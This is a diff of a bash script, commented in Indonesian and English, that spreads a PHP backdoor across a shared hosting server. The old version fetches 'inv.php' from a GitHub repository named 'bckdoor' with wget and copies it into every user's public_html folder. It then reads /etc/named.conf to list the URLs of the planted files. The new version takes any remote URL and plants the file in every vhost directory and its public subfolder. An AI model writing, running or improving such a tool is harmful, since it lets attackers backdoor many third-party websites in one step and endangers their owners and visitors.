@@ -1,26 +1,38 @@
 #!/bin/bash
 
-# Prompt user to enter the filename
-read -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload
+# Meminta nama file yang akan disalin ke semua domain
+read -p "Masukkan nama file PHP (misalnya: bps.php): " file_to_upload
 
-# Download file
-wget "https://raw.githubusercontent.com/chuckyreply/bckdoor/refs/heads/main/inv.php" -O "$file_to_upload"
+# Meminta URL sumber file (RAW link)
+read -p "Masukkan URL file PHP (RAW_URL): " REMOTE_URL
 
-# Iterate through user directories in /home and upload file
-for user_dir in /home/*/public_html; do
-    if [ -d "$user_dir" ]; then
-        # Upload file to public_html directory if exists
-        cp "$file_to_upload" "$user_dir/"
-        echo "File uploaded to $user_dir/"
-    fi
+# Unduh file ke lokal
+if wget -q "$REMOTE_URL" -O "$file_to_upload"; then
+    echo "✅ File berhasil diunduh: $file_to_upload"
+else
+    echo "❌ Gagal mengunduh file dari $REMOTE_URL"
+    exit 1
+fi
+
+# Loop melalui semua direktori domain di /var/www/vhosts
+for domain_dir in /var/www/vhosts/*; do
+    [ -d "$domain_dir" ] || continue
+    domain=$(basename "$domain_dir")
+
+    # Cek lokasi-lokasi target yang mungkin ada
+    for target in "$domain_dir/httpdocs" "$domain_dir/public_html" "$domain_dir" ; do
+        if [ -d "$target" ]; then
+            # Salin file ke folder utama
+            cp -f "$file_to_upload" "$target/" && \
+            echo "✅ https://$domain/$(basename "$file_to_upload") (ke $target)"
+            
+            # Jika di dalamnya ada folder 'public', salin juga ke sana
+            if [ -d "$target/public" ]; then
+                cp -f "$file_to_upload" "$target/public/" && \
+                echo "↳ Juga disalin ke $target/public/"
+            fi
+        fi
+    done
 done
 
-# View contents of /etc/named.conf
-echo "Contents of /etc/named.conf:"
-while IFS= read -r line; do
-    # Check if line contains /var/named/*.db
-    if [[ "$line" =~ /var/named/([^\/]+)\.db ]]; then
-        domain="${BASH_REMATCH[1]}"
-        echo "https://$domain/$file_to_upload"
-    fi
-done < /etc/named.conf
+echo "🎉 Selesai menyalin file ke semua domain yang ditemukan."
